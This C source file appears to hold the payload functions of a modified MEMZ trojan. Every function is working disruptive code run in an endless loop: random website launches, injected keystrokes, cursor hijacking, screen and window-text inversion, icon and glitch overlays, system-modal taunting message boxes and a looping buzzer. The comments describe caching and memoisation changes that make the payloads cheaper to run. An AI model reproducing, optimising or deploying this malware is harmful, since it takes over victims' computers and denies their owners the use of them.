#include <memz/payload_function.h>
#include <memz/data.h>
#include <memz/util.h>
#include <memz/cache.h>

/*
 * Every function in here is called in a loop, forever, by payload_host().
 * The rule they all follow now: if the value only depends on things that
 * change rarely (screen metrics, system icons, the sound files, the shape of
 * the buzzer waveform, the text a window already has), it is computed once
 * and read back out of RAM. See docs/CACHING.md.
 */

/* Same size the original code used for the WM_GETTEXT buffer. */
#define TEXT_BUFFER_CHARS 8192


void shell_execute(window_t* w)
{
    (void)w;
    ShellExecuteA(NULL, "open", sites[random_below((int)sites_size)], NULL, NULL, SW_SHOWDEFAULT);
}

void keyboard_malfunction(window_t* w)
{
    (void)w;
    DWORD rnd = (DWORD)random_below(0x5a - 0x30) + 0x30;

    INPUT input;
    input.type = INPUT_KEYBOARD;
    input.ki.wVk = rnd;

    SendInput(1, &input, sizeof(INPUT));
}

void cursor_malfunction(window_t* w)
{
    (void)w;
    POINT cursor;
    GetCursorPos(&cursor);

    SetCursorPos(
        cursor.x + (random_below(3) - 1) * random_below(1000),
        cursor.y + (random_below(3) - 1) * random_below(1000)
    );
}

void invert_colors(window_t* w)
{
    /* width/height are resolved once per payload thread, not per tick. */
    BitBlt(w->hdc, 0, 0, w->width, w->height, w->hdc, 0, 0, NOTSRCCOPY);
}


/*
 * invert_text: the payload that used to cost the most CPU after the buzzer.
 *
 * The original allocated 16 KB with GlobalAlloc, sent WM_GETTEXT, reversed
 * the string and sent WM_SETTEXT back -- for every window on the desktop,
 * every two seconds, allocating and freeing 16 KB each time.
 *
 * Now:
 *   - one pair of static buffers is reused for every window (no alloc/free),
 *   - the reversal is memoized per window: if the window still holds the
 *     same text, the answer is copied out of RAM instead of recomputed,
 *   - in aggressive mode a window that still holds the result we sent last
 *     time is skipped completely -- no WM_SETTEXT round trip at all,
 *   - in aggressive mode the child list is enumerated every few ticks
 *     instead of on every tick.
 */

static WCHAR text_buffer_in[TEXT_BUFFER_CHARS];
static WCHAR text_buffer_out[TEXT_BUFFER_CHARS];

static void invert_window_text(HWND hwnd)
{
    DWORD_PTR got = 0;

    /* Aggressive mode: a window that still holds what we sent it last time
     * is not even asked again until its probe interval is up. */
    if (!cache_text_due(hwnd))
        return;

    /* One reused buffer instead of a GlobalAlloc/GlobalFree pair per window
     * per tick. WM_GETTEXT also hands back the length, which is what lets
     * the memo compare strings without walking them. */
    if (!SendMessageTimeoutW(hwnd, WM_GETTEXT, TEXT_BUFFER_CHARS,
                             (LPARAM)text_buffer_in, SMTO_ABORTIFHUNG, 100,
                             &got))
        return;

    switch (cache_text_get(hwnd, text_buffer_in, (int)got,
                           text_buffer_out, TEXT_BUFFER_CHARS))
    {
    case MEMZ_TEXT_UNCHANGED:
        /* Already showing our previous result, nobody touched it since:
         * nothing to send, nothing to compute. */
        return;

    case MEMZ_TEXT_CACHED:
        /* text_buffer_out was refilled from the memo. */
        break;

    case MEMZ_TEXT_COMPUTE:
    default:
        /* Only the string itself, not the whole 16 KB buffer. */
        memcpy(text_buffer_out, text_buffer_in,
               ((size_t)got + 1) * sizeof(WCHAR));
        reverse_string_w(text_buffer_out);
        cache_text_put(hwnd, text_buffer_in, (int)got,
                       text_buffer_out, lstrlenW(text_buffer_out));
        break;
    }

    SendMessageTimeoutW(hwnd, WM_SETTEXT, 0, (LPARAM)text_buffer_out,
                        SMTO_ABORTIFHUNG, 100, NULL);
}

static BOOL CALLBACK enum_child_proc(HWND hwnd, LPARAM lParam)
{
    (void)lParam;
    invert_window_text(hwnd);
    return TRUE;
}

#if MEMZ_CACHE_AGRESSIVE

/* The window list barely changes between two ticks 2 seconds apart, so it
 * is remembered for MEMZ_CACHE_CHILD_REFRESH ticks. A stale handle is
 * harmless: SendMessageTimeoutW() on a destroyed window just fails fast. */
static HWND cached_children[MEMZ_CACHE_CHILD_SLOTS];
static int  cached_children_count;
static int  cached_children_ttl;

static BOOL CALLBACK enum_child_collect(HWND hwnd, LPARAM lParam)
{
    int* count = (int*)lParam;

    if (*count < MEMZ_CACHE_CHILD_SLOTS)
        cached_children[(*count)++] = hwnd;

    return TRUE;
}

#endif

void invert_text(window_t* w)
{
    cache_text_tick();

#if MEMZ_CACHE_AGRESSIVE
    if (cached_children_ttl <= 0)
    {
        cached_children_count = 0;
        EnumChildWindows(w->hwnd, &enum_child_collect,
                         (LPARAM)&cached_children_count);
        cached_children_ttl = MEMZ_CACHE_CHILD_REFRESH;
    }
    cached_children_ttl--;

    for (int i = 0; i < cached_children_count; i++)
        invert_window_text(cached_children[i]);
#else
    EnumChildWindows(w->hwnd, &enum_child_proc, 0);
#endif
}


void play_sound(window_t* w)
{
    (void)w;

    int index = random_below((int)sounds_size);

    /* The .wav behind the alias is read into RAM the first time it is
     * played; every later play skips the registry lookup and the file read. */
    size_t size = 0;
    const char* data = (const char*)cache_sound(sounds[index], &size);

    if (data)
        PlaySoundA(data, NULL, SND_MEMORY | SND_SYNC);
    else
        PlaySoundA(sounds[index], GetModuleHandle(NULL), SND_SYNC);
}

static DWORD WINAPI messageBoxThread(LPVOID parameter)
{
    (void)parameter;
    HHOOK hook = SetWindowsHookEx(WH_CBT, message_box_hook, 0, GetCurrentThreadId());
    MessageBoxW(NULL, L"Still using this computer?", L"lol", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
    UnhookWindowsHookEx(hook);

    return 0;
}

void message_boxes(window_t* w)
{
    (void)w;
    CreateThread(NULL, 4096, &messageBoxThread, NULL, 0, NULL);
}

void draw_icons(window_t* w)
{
    /* System metrics and system icon handles never change: cached. */
    int ix = cache_metric(SM_CXICON) / 2;
    int iy = cache_metric(SM_CYICON) / 2;

    POINT cursor;
    GetCursorPos(&cursor);

    DrawIcon(w->hdc, cursor.x - ix, cursor.y - iy, cache_icon((LPCSTR)IDI_ERROR));

    if (random_below((int)(10/(1000/500.0+1)+1)) == 0)
    {
        DrawIcon(w->hdc, random_below(w->width - ix), random_below(w->height - iy),
                 cache_icon((LPCSTR)IDI_WARNING));
    }
}

void tunnel_vision(window_t* w)
{
    StretchBlt(w->hdc, 50, 50, w->width - 100, w->height - 100,
               w->hdc, 0, 0, w->width, w->height, SRCCOPY);
}

void screen_glitches(window_t* w)
{
    /* Guards for screens smaller than the 400 px the original assumed. */
    int span_x = w->width - 400;
    int span_y = w->height - 400;

    if (span_x <= 0 || span_y <= 0)
        return;

    int x1 = random_below(span_x);
    int y1 = random_below(span_y);
    int x2 = random_below(span_x);
    int y2 = random_below(span_y);
    int width = random_below(400);
    int height = random_below(400);

    BitBlt(w->hdc, x1, y1, width, height, w->hdc, x2, y2, SRCCOPY);
}


/*
 * buzzer: the heaviest payload by far.
 *
 * The original synthesised 1 323 000 samples -- each one an integer modulo
 * plus a float division plus a float multiply -- every 30 seconds, forever.
 *
 * `i % freq` only has `freq` distinct outcomes and freq is at most 44, so
 * the entire waveform is a table of at most 11025 + freq bytes per
 * frequency. Building a segment is one memcpy() out of that table, and in
 * aggressive mode not even that: whole 30 second buffers are rendered once
 * and replayed from RAM for the rest of the run.
 */

#if MEMZ_CACHE_AGRESSIVE
static WAVEHDR buzzer_headers[MEMZ_CACHE_WAVE_BUFFERS];
static char*   buzzer_fallback;
#endif

void buzzer(window_t* w)
{
    (void)w;
    WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, MEMZ_WAVE_RATE, MEMZ_WAVE_RATE, 1, 8, 0 };

    HWAVEOUT hwo;
    waveOutOpen(&hwo, WAVE_MAPPER, &fmt, 0, 0, CALLBACK_NULL);

#if MEMZ_CACHE_AGRESSIVE
    unsigned index = 0;

    for (;;)
    {
        unsigned slot = index % MEMZ_CACHE_WAVE_BUFFERS;
        WAVEHDR* hdr = &buzzer_headers[slot];

        char* wavedata = cache_wave_buffer(index);

        if (!wavedata)
        {
            /* Out of memory for the pool: render on the fly instead. */
            if (!buzzer_fallback)
                buzzer_fallback = (char*)LocalAlloc(0, MEMZ_WAVE_BYTES);
            if (!buzzer_fallback)
                return;
            wavedata = buzzer_fallback;
            cache_wave_render(wavedata);
        }

        if (!hdr->lpData)
        {
            /* Each buffer is prepared exactly once, not once per pass. */
            hdr->lpData = wavedata;
            hdr->dwBufferLength = MEMZ_WAVE_BYTES;
            waveOutPrepareHeader(hwo, hdr, sizeof(WAVEHDR));
        }

        hdr->dwFlags &= ~WHDR_DONE;
        waveOutWrite(hwo, hdr, sizeof(WAVEHDR));

        while (!(hdr->dwFlags & WHDR_DONE))
            Sleep(1);

        index++;
    }
#else
    char* wavedata = (char*)LocalAlloc(0, MEMZ_WAVE_BYTES);
    if (!wavedata)
        return;

    WAVEHDR hdr = { wavedata, MEMZ_WAVE_BYTES, 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

    for (;;)
    {
        /* Byte identical to the original generator, ~120 memcpys instead of
         * 1.3 million float divisions. */
        cache_wave_render(wavedata);
        hdr.dwFlags &= ~WHDR_DONE;

        waveOutWrite(hwo, &hdr, sizeof(hdr));

        while (!(hdr.dwFlags & WHDR_DONE))
            Sleep(1);
    }
#endif
}
